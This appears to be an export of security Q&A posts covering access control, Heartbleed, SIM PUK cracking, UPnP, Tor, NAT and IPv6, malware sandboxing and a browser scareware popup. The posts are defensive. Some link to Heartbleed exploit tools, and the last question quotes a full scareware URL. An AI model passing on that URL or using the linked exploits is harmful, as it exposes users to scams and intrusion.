<p>To implement access control, you code the web application so that each page checks whether the user is authorized to view that page before allowing the user to view that page.  For instance, for the page listed above, the logic implementing that page would check the identity of the currently-logged in user.  If the id of the logged-in user matches the producerId of the page parameter, then you show them the information.  If the id does not match, you do not show them the information: if it is some other user, you show them an error page (with information about how to get access), or if the user has not logged in yet, you redirect them to a login page.</p>

<p>This won't break bookmarks.  It does not require changes to the database, changes to the persistence layer, or role-based access control.  It does require you to have a way to look up the identity of the currently logged-in user and associate that with their provider ID.  Also, if you want to allow manager and supervisors to see the data for all other agents, then you need a way to look up the currently logged-in user and determine whether they are a manager or supervisor or not.  If you want to allow only the agent's manager/supervisor to view their page (not all other managers/supervisors), then you need to have a way to determine the manager/supervisor of each agent.  These are pretty basic, minimal requirements; it is hard to see how you could avoid them.</p>

<p>As @symbcbean properly points out, this is a very common error frequently found in web applications.  A typical example might be a site that uses some guessable parameter value to identify a resource, and does not adequately authenticate the user.  For instance, suppose orders are assigned a sequential order number:</p>

<pre><code>https://www.example.com/show_order.php?id=1234
https://www.example.com/show_order.php?id=1235
https://www.example.com/show_order.php?id=1236
...
</code></pre>

<p>and suppose that anyone who knows the URL can view the order.  That would be bad, because it means that anyone who knows (or guesses) the order number can view the order, even if they are not authorized to do so.  This is one of <a href=""https://www.owasp.org/index.php/Top_10_2010-Main"">OWASP's Top Ten</a> web application security risks: <a href=""https://www.owasp.org/index.php/Top_10_2010-A4"">Insecure Direct Object References</a>.  For more information, I recommend reading the resources available on OWASP.  OWASP has lots of great resources on web application security.  </p>

<p><strong>Other comments.</strong> Others have suggested using SSL.  While that will not prevent parameter tampering, it is a general good security practice that defends against other kinds of problems.  Using SSL is straightforward: just configure your website to use https, instead of http (and ideally, enable HSTS and set the <code>secure</code> bit on all cookies).</p>

<p>Also, it is often better to avoid storing confidential information in URL parameters, all else being equal.  You can store the confidential information in session state or in the database.</p>
","17274"
"Browsec - VPN and anonymizer","33624","","<p>According to <a href=""https://browsec.com/en/"" rel=""nofollow"">Browsec</a>'s website this application can be used to Bypass firewalls. So in countries like Iran it seems a useful tool to bypass censorship and filtering.</p>

<p>For start using this application there are two version available, A ""<a href=""https://browsec.com/chrome_addon?locale=en"" rel=""nofollow"">Chrome extension</a>"" and a ""Portable Firefox"" version.</p>

<p>My question is that is it safe to use Chrome extension of this software? can it cause security problem when i log in to Gmail and other password protected websites when i use this extension?</p>

<p>For example can this application secretly steal my passwords?</p>
","<p>You are mentionning two Privacy issues here: Circumvention of censorship &amp; password protection.</p>

<p>When it comes to <strong>government firewalls</strong>, it is wise to use widely spread softwares, as they have been tested a lot and are known to work as safely as you can find. The reference here is <a href=""https://www.torproject.org/"" rel=""noreferrer"">TOR</a> and is used daily by insurgents in countries famous for their restricted internet access like Syria or China.</p>

<p>For your <strong>password privacy</strong>, this is not a topic I am very knowledgeable in, but I would advise you to not use any extension on your browser when typing a password. I would not even trust the browser itself. If whatever you are doing is highly sensitive, I would suggest using <a href=""https://tails.boum.org/"" rel=""noreferrer"">Tails</a> that comes bundled with… TOR!</p>

<p>For your specific application (Browsec), there are several signs that you shouldn't trust it:</p>

<ul>
<li>it is closed source (<a href=""http://en.wikipedia.org/wiki/Open-source_software_security"" rel=""noreferrer"">debatable</a>, but you don't know what happens behind)</li>
<li>has very little review online (drawbacks of not being famous)</li>
<li>says they collect your data and may transmit it to a <a href=""https://browsec.com/en/privacy-policy"" rel=""noreferrer"">government</a></li>
<li>state that the traffic <a href=""https://chrome.google.com/webstore/detail/browsec/omghfjlpggmjjaagoclmmobgdodcjboh/related?hl=en"" rel=""noreferrer"">goes through their network</a>, hence any access to an unencrypted website, they can read it all. possibly SSL protected ones aswell depending on implementation.</li>
</ul>
","64126"
"What clients are proven to be vulnerable to Heartbleed?","33527","","<p>On <a href=""http://heartbleed.com/"" rel=""nofollow noreferrer"">several</a> <a href=""https://security.stackexchange.com/q/55119/2630"">pages</a>, it is re-iterated that attackers can obtain up to 64K memory from the server or client that use an OpenSSL implementation vulnerable to Heartbleed (CVE-2014-0160). There are <a href=""http://filippo.io/Heartbleed/"" rel=""nofollow noreferrer"">dozens</a> <a href=""http://s3.jspenguin.org/ssltest.py"" rel=""nofollow noreferrer"">of</a> <a href=""https://gist.github.com/takeshixx/10107280"" rel=""nofollow noreferrer"">tools</a> that reveal the bug in server applications.</p>

<p>So far I have not seen a single tool that exploits the bug in client applications. Is it that hard to exploit the bug at clients? Are clients actually vulnerable or not?</p>
","<p>As a matter of fact, <em>yes</em>, clients are vulnerable. So far the attention has been focused on servers as they are much more open to exploitation. (Almost) everyone can connect to a public HTTP/SMTP/... server.</p>

<p><a href=""http://blog.existentialize.com/diagnosis-of-the-openssl-heartbleed-bug.html"">This blog</a> describes how the bug actually works (it mentions <code>dtls_process_heartbeat()</code>, but <code>tls_process_heartbeat()</code> is affected in the same way). This function is used both for clients and server applications, so indeed clients <em>should</em> be vulnerable too.</p>

<p>According to RFC 6520, heartbeats should not be sent during handshakes. In practice, OpenSSL accepts heart beats right after the sending a ServerHello (this is what Jared Stafford's ssltest.py does). Upon further testing, I have discovered that servers can abuse clients by sending a Heartbeat right <em>after</em> sending the ServerHello too. It triggers the same bug.</p>

<p>A proof of concept can be found in my repo at <a href=""https://github.com/Lekensteyn/pacemaker"">https://github.com/Lekensteyn/pacemaker</a>. From its README:</p>

<blockquote>
  <p>The following clients have been tested against 1.0.1f and leaked
  memory before the handshake:</p>
  
  <ul>
  <li>MariaDB 5.5.36</li>
  <li>wget 1.15 (leaks memory of earlier connections and own state)</li>
  <li>curl 7.36.0 (https, FTP/IMAP/POP3/SMTP with --ftp-ssl)</li>
  <li>git 1.9.1 (tested clone / push, leaks not much)</li>
  <li>nginx 1.4.7 (in proxy mode, leaks memory of previous requests)</li>
  <li>links 2.8 (leaks contents of previous visits!)</li>
  <li>KDE 4.12.4 (kioclient, Dolphin, tested https and ftps with kde4-ftps-kio)</li>
  <li>Exim 4.82 (outgoing SMTP)</li>
  </ul>
</blockquote>

<p>It has been demonstrated that 64 KiB of memory (65535 bytes) can indeed returned. It has also been demonstrated that clients (<code>wget</code>, KDE Dolphin, ...) can leak data like previous requests possibly containing passwords.</p>
","55250"
"Is it possible to crack a PIN / PUK code on a phone SIM card?","33474","","<p>When deploying a mobile phone best practices policy, one of the points which were raised was the requirement for the user to protect his SIM card with a <code>PIN</code>. The theory is that three failed attempts to input the right <code>PIN</code> switches the SIM card into <code>PUK</code> mode, and 10 failed attempts to input the <code>PUK</code> make the card unusable.</p>

<p>What is the reality of this assumption? One of the uses of a stolen mobile phone is to robot-call specific numbers and drain the user account:</p>

<ul>
<li>is it practically possible* to crack the <code>PIN</code> code, either directly or by cloning the SIM and testing the 10,000 possible codes?</li>
<li>is it practically possible* to crack the <code>PUK</code> code? This one is longer but since it can be recovered by the carrier it means that a SIM ID can be used to generate such a code. </li>
</ul>

<p>*) ""practically possible"" means doing it quickly enough to use the SIM before it is blocked (say, an hour)</p>

<p>I am interested in the technical aspects of the question (there are legal as well, when it comes to a policy ; there is also the possibility of fraud with the help of a carrier operator who would generate a <code>PUK</code>)</p>
","<p>Karsten Nohl had a nice presentation at Blackhat 2013 (<a href=""https://www.blackhat.com/us-13/briefings.html#Nohl"">https://www.blackhat.com/us-13/briefings.html#Nohl</a>) claiming that many SIM cards are rootable.</p>

<p>The crux of his attack is based on the Over-The-Air (OTA) software updates for these cards, which are typically sent via ""secure"" binary SMS directly to the SIM.  He claims that in ~25% of the cases, the SIM will respond with a signed error message to an invalid attempt to update its code, and that for about 50% of the SIMs on the market, the signature will be encrypted with the very old and crackable Digital Encryption Standard (DES).  Worse yet, the signature is signed with the same key as is used to sign code, so that once it is broken offline it can be used to send a software update to the SIM.</p>

<p>This software update does not, in itself, provide access to the PUK, but by utilizing an unspecified memory vulnerability, Nohl claims to have been able to break out of the SIMs Java sandbox and get access to this key.</p>

<p>If you believe Nohl (and I have no reason not to), this demonstrates that:</p>

<ol>
<li>It is possible to get the PUK for many SIMs on the market,
especially old ones.</li>
<li>It is not something that an average user can do right now.</li>
</ol>
","59018"
"What are the security implications of enabling UPnP in my home router?","33354","","<p>I found port forwarding entries in home router that I haven't manually configured. Is that because of UPnP?</p>

<p>Are applications simply able to tell the router to forward ports on their own? Are there any security implications with enabling UPnP?</p>
","<p>Many modern home routers usually come with a feature called <a href=""https://en.wikipedia.org/wiki/Universal_Plug_and_Play"" rel=""nofollow noreferrer"">Universal Plug and Play</a> (UPnP) to allow <a href=""https://en.wikipedia.org/wiki/NAT_traversal"" rel=""nofollow noreferrer"">NAT traversal</a> using the <a href=""https://en.wikipedia.org/wiki/Internet_Gateway_Device_Protocol"" rel=""nofollow noreferrer"">IGD Protocol</a>. What that means is that an application can ask the router ""Hey, could you please let external computers speak to me on port xxxx"", then the router creates a <a href=""https://en.wikipedia.org/wiki/Port_forwarding"" rel=""nofollow noreferrer"">port map</a> for the requested port.</p>

<p>UPnP has a variety of security problems, the main of which is that it doesn't have any built-in authentication. One example is <a href=""http://www.gnucitizen.org/blog/hacking-the-interwebs/"" rel=""nofollow noreferrer"">PoC by Petko D. Petkov</a> where he demonstrated how Flash can be used to send UPnP commands to a local router when visiting a malicious page. UPnP also makes it much easier for malware on your computer to open ports and listen for commands from a <a href=""https://en.wikipedia.org/wiki/Botnet"" rel=""nofollow noreferrer"">C&amp;C Sever</a>.</p>

<p>Despite not being around for a long time, UPnP has a long list of security issues mainly due to poor implementation. Researchers at <a href=""https://web.archive.org/web/20150927034259/https://community.rapid7.com/docs/DOC-2150"" rel=""nofollow noreferrer"">Rapid7 have shown</a> that nearly 81-million IP addresses have responded to their UPnP requests (mind you, those requests are coming from external networks), and many of these devices had vulnerabilities that can lead to complete takeover.</p>

<p><strong>So my advice is this</strong>: If you want port-forwarding, you probably want it for a reason for a specific program, so disable UPnP and map the ports yourself. It's not something you'll be doing everyday.</p>
","38661"
"Can my workplace view my Tor traffic?","33348","","<p>I connect to the internet using my company's Wi-Fi and Tor. Can they still see the websites I visit?</p>
","<p>Generally speaking <em>No</em>. Assuming: </p>

<ol>
<li><p>You follow Tor's <a href=""https://www.torproject.org/download/download-easy.html.en#warning"">best practices</a> </p>

<blockquote>
  <p>Tor does not protect all of your computer's Internet traffic when you run it. Tor only protects your applications that are properly configured to send their Internet traffic through Tor. To avoid problems with Tor configuration, we strongly recommend you use the Tor Browser.</p>
</blockquote>

<p>so if it's not setup correctly things can still leak like DNS requests for example.</p></li>
<li><p>You are using a private computer (or at least one the company doesn't control). If they are admins on your computer they could install VNC or some logging software that will record your actions regardless of what software you use.</p></li>
</ol>
","65185"
"For how long ISPs keep record of Internet usage?","33234","","<ul>
<li><p>For how long ISPs keep record of Internet usage?</p></li>
<li><p>Do they keep record of every page we visit?</p></li>
<li><p>In what form do they keep such records (remote IP, URL, page title, headers, etc.)? </p></li>
<li><p>Is it possible for an employee working at ISP to monitor an individual customer's Internet usage?</p></li>
</ul>
","<p>Well, technically they <em>can</em> log all of what you mentioned and more. Your ISP is in the technical position to monitor and log (and modify!) every single byte you send and receive via the internet, and they would be capable of doing it without drawing much attention when they would want to. But whether or not they <em>do</em> depends on two factors: </p>

<ol>
<li>How much surveillance is economically useful for them (inspecting and analyzing petaybytes of internet traffic costs a lot more hardware than just routing it blindly) </li>
<li>How much the local laws require or prohibit them to do it.</li>
</ol>

<p>One information you can be quite certain that is logged for a longer time is what IP address you had when. I wouldn't know a country where you won't get caught when you commit a crime online and law enforcement is able to get the IP address you had while doing it.</p>

<blockquote>
  <p><strong>The rest of this answer focuses on the situation in countries which belong to the European Union.</strong> Input from people knowledgeable about local laws in other parts of the world would be appreciated.</p>
</blockquote>

<p>In the EU, there is the <a href=""http://en.wikipedia.org/wiki/Data_Retention_Directive"" rel=""nofollow"">data retention directive</a> which states that all EU countries must make local laws which force the ISPs to record the following data of all their users for at least six months:</p>

<ul>
<li>When and for how long they were online</li>
<li>IP address they got assigned and when</li>
<li>Who they connected to using IP telephony</li>
<li>Receivers and senders of their email</li>
</ul>

<p>But this directive says that this data must only be used for law enforcement purposes. There is also the <a href=""http://en.wikipedia.org/wiki/Data_Protection_Directive"" rel=""nofollow"">EU data protection directive</a> which requires EU countries to have local laws which prohibit ISPs (or anyone who deals with personal data) from recording more data than necessary and using it for purposes they haven't notified their customers about. This greatly limits what they can (<em>legally!</em>) do with the data they record.</p>

<p>How different EU countries ratify these directive in local laws vary. Some countries didn't ratify them completely, others have local laws which go far beyond. <strong>Check your local laws for more information</strong>.</p>

<p>Another interesting source of information could be <strong>the privacy policy of your ISP</strong>. It should include a section about what data they log and for what purpose.</p>

<p><strong>Regarding illegal monitoring</strong>: One could argue that just because the law prohibits an ISP from snooping on their users doesn't mean that they follow these laws. They are <em>large evil corporations</em>™, after all. An ISP could snoop on users illegally. But keep in mind that ISPs are profit-oriented companies. The only reason for them to do large-scale surveillance would be to sell that data to someone. While they certainly are in a position to collect a lot of data which would be extremely valuable for certain parties, they can hardly make business with them. The risk of getting found out and suffering the resulting PR disaster is just too big for them.</p>
","54499"
"Is it possible to use wildcard certificates on multiple devices?","33197","","<p>I have a server that I want to use a wildcard cert on.  It runs multiple services.  I purchase a wildcard cert so that I can protect mail.something.dom, www.something.dom, im.something.dom, calendar.something.dom, addressbook.something.dom</p>

<p>A few months later I come into several new servers.  I now have enough servers that I could set one up for each subdom that I created.  I want to use my wildcard cert rather than buy an SSL cert for each one.</p>

<p>Is it possible if I:</p>

<ol>
<li>Copy the public and private keys for the wildcard cert from the original server.</li>
<li>Place a copy of each of the keys in each new server.</li>
<li>Place a copy of the wildcard cert in each new server.</li>
</ol>

<p>If this is not the process to do this, is there a process that will work?</p>
","<p>The process you describe will work. Whether you will be able to enact it is a different thing: it depends on where, exactly, your private key is. In Windows systems, a private key might be marked as ""non exportable"", which means that Windows will not allow the export; the export is still possible (Windows is only software, it cannot do miracles) but <a href=""https://stackoverflow.com/questions/3914882/how-to-export-non-exportable-private-key-from-store"">somewhat hackish</a>. On Linux systems, private keys are just files and files can be copied at will. If your private key generation and storage involved <a href=""http://en.wikipedia.org/wiki/Hardware_security_module"" rel=""nofollow noreferrer"">dedicated hardware</a> then see the documentation of your HSM for possible options.</p>

<p>Possible objections against such a plan are the following:</p>

<ul>
<li><p>There may be contractual issues. It really depends on the CA. The CA does not have technical power to prevent you from moving your private key from server to server (it is your key on your machines, they cannot spy on that), but they can still define it as a contract breach, at least theoretically. Commercial CA make money out of selling certificates, and you are buying and using a wildcard certificate precisely so that you do not have to buy a new certificate for each new server name; the commercial people at the commercial CA will understandably feel queasy at the concept, hence the possibility of some legal hindrance.</p></li>
<li><p>The value of a private key resides in its privacy. If your private key becomes known to outsiders, then you have a big problem. As a general rule, any export-transfer-import operation potentially <em>exposes</em> the private key; the more a private key travels, the less private it becomes. The ""recommended way"" is to have each server (physical machine) generate its own key pair, and never export the private key at all. What you suggests is at odds with this general principle, so beware.</p></li>
<li><p>If the private key is stolen, then the certificate will have to be revoked, and this will impact <em>all</em> your servers at the same time. With several distinct certificates, damage is more contained. Similarly, when the wildcard certificate expires, a renewal will have to be done, and the new certificates installed on all servers simultaneously. Depending on how many distinct servers you have, this may prove to be cumbersome.</p></li>
</ul>
","41066"
"Wireless client isolation - how does it work, and can it be bypassed?","32906","","<p>Many SOHO routers these days support a feature called ""wireless client isolation"", or similar.  What this is supposed to do, in principle, is to limit the connectivity between wireless clients connected to the AP.  Wireless clients can talk to the LAN, and reach the Internet if such connection is available, but they cannot communicate with one another.</p>

<p>How is this achieved?  Are there any particular weaknesses which would allow this to be easily bypassed?</p>
","<p>The implementation that I've seen of this is done by fiddling with the MAC forwarding table on the access point. Since the access point simply acts as a network bridge, it is fairly well suited to this kind of task. At the switching layer it is already collecting all of the heard (sometimes called learned) MACs and which interface it can be found on.</p>

<p>The logic looks kind of like this:</p>

<ol>
<li>Access Point receives a packet over the wireless interface</li>
<li>Bridging subsystem examines packet for destination MAC</li>
<li>If destination MAC is in the learned switching table for wireless interface -> DROP</li>
<li>Otherwise forward packet via wired interface</li>
</ol>

<p>Because of the way network bridges work I see this being fairly difficult to trick the access point into forwarding a packet to a client in spite of the isolation. Your best bet would be to attempt to talk directly to the other client, as if you were operating with an ad-hoc network.</p>
","16814"
"What's the advantage of using PBKDF2 vs SHA256 to generate an AES encryption key from a passphrase?","32869","","<p>I'm looking at two comparable pieces of software which encrypt data on disk using a passphrase. One uses PBKDF2 to generate the encryption key from a passphrase, while the other uses two rounds of SHA256. What's the difference? Is one preferred over the other?</p>
","<p>The difference is that:</p>

<ul>
<li>PBKDF2 <strong>by design</strong> is slow</li>
<li>SHA256 is a good hash function; it is not slow, by design</li>
</ul>

<p>So if someone were to try a lot of different possible passphrases, say the whole dictionary, then each word with a digit appended, then each word with a different capitalisation, then two dictionary words, etc. then this process would be much slower with PBKDF2.</p>

<p>But if your passphrase is truly secure, that is very long, pretty random and out of reach of any systematic enumeration process, then it makes no practical difference, except that an attacker may spend more resources trying to break your passphrase (or maybe less if they decide to give up sooner).</p>
","16357"
"With IPv6 do we need to use NAT any more?","32796","","<p>I'm wondering how to use NAT with IPv6. Seems that you don't even need it any more. So what exactly is the concept behind firewall configurations in IPv6 environments?</p>
","<p>There is some widespread confusion about <a href=""http://en.wikipedia.org/wiki/Network_address_translation"">NAT</a>.</p>

<p>NAT has never been meant to be used as a security feature. However, it so happens that in <em>most</em> cases (not all), when a machine has access to the Internet through NAT only, then the machine is somehow ""protected"". It is as if the NAT system was also, inherently, a firewall.</p>

<p>Let's see how it works:</p>

<ul>
<li>An IP packet has a source and a destination address. Each router, upon seeing the destination address, decides to which subsequent router the packet shall be sent.</li>
<li>When a router implements NAT, it forwards outgoing packets under a guise; namely, the packets bear as source address to router's external IP, not the actual source. For incoming packets, the router does the reverse operation. The TCP/UDP <em>port numbers</em> are used to know to what internal host the packets relate.</li>
<li>However, from the point of view of the router, the internal hosts have (private) IP addresses which are directly reachable. NAT is for communications between the internal hosts and machines <em>beyond</em> the router.</li>
</ul>

<p>Let's take an example:</p>

<pre><code>Inner &lt;---&gt; HomeRouter &lt;---&gt; ISPRouter &lt;---&gt; The Internet
</code></pre>

<p>""Inner"" is your PC. ""HomeRouter"" is the router which does the NAT. ""ISPRouter"" is the router at your ISP.</p>

<p><strong>The ""firewall effect""</strong> is the following: <em>usually</em>, even if ""Inner"" has an open port (it runs a remotely reachable service, e.g. a local Web server on port 80), people from ""the Internet"" will not be able to connect to it. The reason is the following: there are two ways by which an IP packet may be transferred by HomeRouter to Inner:</p>

<ul>
<li><p>An incoming packet may come with HomeRouter's address as destination, and targeting a port which HomeRouter knows to be associated with an <em>outgoing</em> connection from Inner to somewhere on the Internet. This works only for a connection which was initiated by Inner, and this implies that the port will not match that of the server which runs on Inner.</p></li>
<li><p>An IP packet contains Inner's private IP address as destination and is <em>somehow</em> brought to the attention of HomeRouter. But ISPRouter does not know Inner's private IP, and would not forward an IP packet meant for that address to HomeRouter. <a href=""http://en.wikipedia.org/wiki/Source_routing"">Source routing</a> could be used to tag a packet with Inner's private IP address as destination <em>and</em> HomeRouter's public IP address as intermediate host. If ISPRouter supports source routing, then such a packet will reach Inner, regardless of NAT. It so happens that almost no ISP actually supports source routing.</p></li>
</ul>

<p>Therefore, the ""firewall effect"" of NAT relies on two properties:</p>

<ul>
<li><em>Attackers are far</em>: attackers do not inject packets directly on the link between the home router and the ISP; all their attempts must go through the ISP routers.</li>
<li><em>ISP don't allow source routing</em>. This is the (very) common case.</li>
</ul>

<p>So <strong>in practice</strong> there are a lot of machines, in private homes and small business, which could be hacked into in a matter of seconds except that they benefit from the ""firewall effect"" of NAT.</p>

<hr />

<p>So what of IPv6 ? NAT was designed and deployed (<em>widely</em> deployed) in order to cope with the scarcity of free IPv4 addresses. Without NAT, the <a href=""http://ipcalypse.net/"">IPcalypse</a> would have already destroyed civilization (or triggered IPv6 actual usage, maybe). IPv6 uses 128-bit addresses, instead of the meagre 32-bit IPv4 addresses, precisely so that crude workarounds like NAT need not be used.</p>

<p>You can use NAT with IPv6, but it makes little sense: if you can live with NAT, why would you switch to IPv6 at all ?</p>

<p>However, without NAT, then no ""firewall effect"", flimsy as it could be. Most operating systems are now IPv6 ready, and will use it automatically if given the chance. Therefore, if an ISP decides to switch IPv6 on, just like that, then a lot of machines which were hitherto ""hidden"" behind a NAT will become reachable from the outside. This could well turn into a worldwide hacking orgy. It is no wonder that ISP are somewhat... reluctant.</p>

<p>To switch to IPv6 <em>nicely</em>, you have to couple its enabling with some solid, well-thought firewalling rules, which will prevent incoming connections which were not possible in a NAT world (with the caveats explained above), but are now feasible thanks to the magic of IPv6. The operational word here is ""think"": this will require some time from some people, and that's not free.</p>

<p>So it can be predicted that IPv4 will be used and maintained as long as it can be tolerated, and, thanks to NAT and transparent proxies, this will be a <em>long</em> time (especially if we succeed at containing human population below 10 billions).</p>
","44068"
"How do I safely inspect a suspicious email attachment?","32789","","<p>I received a pretty blatantly spammy email to my Gmail account. I'm not really sure how it made it through the spam filters, since it has all of the telltale signs. The FROM field is spoofed as upsservices@ups.com, but the headers reveal the sender's IP as 178.90.188.166... which points back to an ISP in Kazakhstan.</p>

<p>Anyway, attached to the email is a supposed HTML file. My first hunch was that it was probably one of the following:</p>

<ol>
<li>A nasty executable file masquerading as a simple HTML file, or</li>
<li>An actual HTML file meant to be opened in a browser in a phishing attack</li>
</ol>

<p>(edit: Or one of the others mentioned by @Adnan)</p>

<p>My guess is that it really is an HTML file, since Gmail claims the attachment is only 1K in size.</p>

<p>I know I should probably just mark this as spam and get on with my life, but my curiosity is getting the best of me... I really want to know what's in that attachment. Is there a safe way to go about downloading it to a sandboxed location and inspecting the contents? I'm at the beginning of a career shift into the security field, and I would love to pick apart this real world example of something potentially nasty and see how it ticks.</p>

<p>I'm thinking a LiveCD or a VM would be a safe environment... I would prefer to do it in a clean, un-networked environment, but in any case, I'll still be logging into my Gmail account to download the thing.</p>

<p>Any suggestions?</p>

<p><strong>Update:</strong></p>

<p>I was probably over thinking this. I ended up making sure a downloaded file wouldn't automatically execute or open in a browser, then inspected the source code. It is indeed an HTML file that runs some shady Javascript. They're doing some clever stuff in the code, including masking a destination document.location redirect as hex code. Converting it to ascii reveals the destination as a php script on a .ru domain (I won't share it because I want to be a good Internet Citizen). I can't make sense of the code's true goal... it's not exceptionally complicated, but it's pretty muddled and convoluted, presumably to take advantage of browser bugs (it claims to be ""Internet Explorer compatible only"").</p>

<p>Anyway, I wasn't originally planning on running the suspicious file... I mostly wanted to see the source code. Now I'm tempted to set up a little something like @Adnan recommends and give it a go.</p>
","<p><em>3. HTML page with JavaScript code attempting exploit a <a href=""https://blog.mozilla.org/security/2009/07/14/critical-javascript-vulnerability-in-firefox-35/"">vulnerability in your browser</a>.</em></p>

<p><em>4. HTML page with an embedded Java applet attempting to exploit a <a href=""http://thenextweb.com/insider/2013/01/10/new-java-vulnerability-is-being-exploited-in-the-wild-disabling-java-is-currently-your-only-option/"">vulnerability in the JVM</a></em> </p>

<p><em>5. HTML page with an embedded Flash file attempting to exploit a <a href=""http://msisac.cisecurity.org/advisories/2013/2013-031.cfm"">vulnerability in Flash Player</a></em></p>

<p><em>6. The email itself, before you open the attachment could try to exploit a <a href=""http://technet.microsoft.com/en-us/security/bulletin/MS10-045"">vulnerability in your email client</a></em></p>

<p>There might be other possibilities.</p>

<p>For this purpose, I have the following setup:</p>

<ul>
<li><p>Virtual Machine using <a href=""https://www.virtualbox.org/"">VirtualBox</a>. No network access.</p></li>
<li><p>I have a snapshot saved for the VM after a fresh OS install.</p></li>
<li><p>I also take two snapshots with <a href=""http://www.majorgeeks.com/What_Changed_d5018.html"">What Changed?</a> and <a href=""http://www.withopf.com/tools/trackwinstall/"">TrackWinstall</a>.</p></li>
<li><p>I copy files <strong>only</strong> in the direction Host -> VM, using a <a href=""http://www.winiso.com/products/winiso-free.html"">free ISO creator</a>.</p></li>
<li><p>I create the <code>.iso</code> file and mount it. Then I can have all the fun I want on the VM itself.</p></li>
<li><p>I usually run the malware and study memory usage, CPU load, listening ports, networking attempts.</p></li>
<li><p>I check the changes to the OS using What Changed? and TrackWinstall.</p></li>
<li><p>Finally I restore to the fresh snapshot.</p></li>
</ul>

<p>The reason I have the whole setup is because I like to <em>run</em> the malware and see what it's trying to do.</p>

<p><strong>Update:</strong></p>

<p>I was talking to colleague who performs malware analysis as a hobby and he told me about his setup, it might be different that what you might want for an occasional <code>.html</code> attachment check.</p>

<ul>
<li><p>Old PC with a fresh OS install.</p></li>
<li><p>After installing the needed tools he takes a full-disk image using <a href=""http://clonezilla.org/clonezilla-live.php"">Clonezilla Live</a>.</p></li>
<li><p>What Changed for snapshots comparisons.</p></li>
<li><p>The PC is connected to the Internet through a separate network.</p></li>
<li><p>Whenever he finishes working on a sample, he reboots with Clonezilla and restores the full-disk image.</p></li>
</ul>
","32931"
"Why do sites implement locking after three failed password attempts?","32779","","<p>I know the reasoning behind not letting infinite password attempts - brute force attempts is not a <a href=""https://en.wikipedia.org/wiki/Real_life"">meatspace</a> weakness, but a problem with computer security - but where did they get the number three from?</p>

<p>Isn't denial of service a concern when implementing a lockout policy that is easily activated?</p>

<p>Is there any hard research showing an optimal number or range to choose before locking out an account that balances actual security threat with usability?  </p>

<p>Thinking it through, I don't see any measurable security difference between three attempts and 20 attempts with the password complexity generally in use today. </p>

<p>(I know this skirts subjectivity, but I'm looking for measurement based opinions)</p>
","<p>Recently, at the OWASP AppSec 2010 conference in Orange County, Bill Cheswick from AT&amp;T talked at length about this issue.</p>

<p>In brief, there's insufficient research.</p>

<p>In long, here are some of his ideas for less painful account locking:</p>

<ul>
<li>Don't count duplicate password attempts (they probably thought they mistyped it)</li>
<li>Make the password hint about the primary password, and don't have a (weak) secondary</li>
<li>Allow a trusted party to vouch for the user, so he can change his password.</li>
<li>Lock the account in increasing time increments</li>
<li>Remind the user of password rules.</li>
</ul>
","498"
"""Virus Found"" Web Browser Pop-up","32754","","<p>I use a website that typically creates a new tab with an ad on the first click. Usually, I can close the tab without even looking at it, but recently a more aggressive strain brings up a pop-up (for both Safari and Chrome on OS X) saying ""Virus Found""... which I took a screenshot of:</p>

<p><a href=""https://i.stack.imgur.com/X16CV.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/X16CV.png"" alt=""&quot;Virus Found&quot; Web Browser Pop-up""></a></p>

<p>The first few times this happened, I was using Safari, panicked, and just quit out of Safari, which worked fine. For some reason, Safari would typically not re-encounter this pop-up (or any new tab ads from the site) until I closed all the way out of Safari again.</p>

<p>I recently used Chrome, which got locked by the same pop-up but would not quit (that is, right-clicking the chrome icon in the dock and clicking ""Quit"" was non-responsive). So, I clicked the ""OK"" on the pop-up which brought me to an obviously scammy site wanting me to click a button to scan my computer for viruses. I did not click that button; rather, I immediately closed out of that tab. I've noticed that Chrome does not re-display that ad unless I delete its browser cache/history.</p>

<p>My first question is: could any harm have been done by clicking the Safari/Chrome pop-up ""OK"" button which redirected me to a scam site (note that I immediately closed out of the scam site)?</p>

<p>A related question that I am simply curious if anyone knows the answer to is why Chrome has a much harder time with this than Safari?</p>

<p>Some additional information: I installed AdwareMedic and scanned for Adware but it found nothing; after that, I followed instructions to look at Safari's extensions (but there are none) and to change the homepage to google (with https) which I did and the pop-up has not returned on Safari since then. I followed similar instructions to ""Reset Settings"" for Chrome which only brought the pop-up back (it disappears after clicking the ""OK"" until I remove that event's history/cache I think).</p>

<p><strong>EDIT</strong>
I think @aviv adequately answered my question, but in case this may sate curiosity or help future users, I'll post here the scam url (which I do not recommend visiting)</p>

<p><a href=""http://app.macoscleaner.com/secure/en8/index.html?voluumdata=vid..00000003-a935-4042-8000-000000000000__vpid..4f731800-0f3e-11e5-8777-238ebdf4bb87__caid..48dced12-25c7-4982-b011-527d198fa9ea__rt..D__lid..b1d13635-3362-4e00-b49f-3daef77eb6d5__oid1..07bb6eaa-c983-4d90-b4ad-3670b87ec557__var1..20026__rd..onclickads%5C.%5Cnet&amp;zoneid=20026&amp;visitor_id=66476472834"" rel=""nofollow noreferrer"">http://app.macoscleaner.com/secure/en8/index.html?voluumdata=vid..00000003-a935-4042-8000-000000000000__vpid..4f731800-0f3e-11e5-8777-238ebdf4bb87__caid..48dced12-25c7-4982-b011-527d198fa9ea__rt..D__lid..b1d13635-3362-4e00-b49f-3daef77eb6d5__oid1..07bb6eaa-c983-4d90-b4ad-3670b87ec557__var1..20026__rd..onclickads%5C.%5Cnet&amp;zoneid=20026&amp;visitor_id=66476472834</a></p>

<p>Additionally, the website that sparked this question has a url of www dot animefreak dot tv (I don't have enough reputation to post another url).</p>

<p>To try to get the pop-up to appear (there are other new tab ""on-click"" ads that appear that don't cause a dialog box to appear and go to more mundane sites), I recommend using Chrome's Incognito mode, since the site seems to have a timer or something on normal use (that is, a pop-up occurs when I click one of the hyperlinks on the site only after a while; after I close it on Safari/Chrome for my normal preferences, it does not show up again for a while but it does every time for Incognito Chrome).</p>

<p>If people think this update/edit would better serve the community as a new question (about how a site can open a new tab even though my preferences say not to allow such, or something along those lines), leave a comment and I will do so.</p>

<p>Also note that I'll may be out of contact for up to a week at a time but I will be active when able to do so.</p>
","<p>This message is just utilizing the alert function from javascript which is used to display a message to the user. One thing you need to understand is that once this tab has been opened you have already browsed to the ""scam"" site, the message is shown by the scam site.
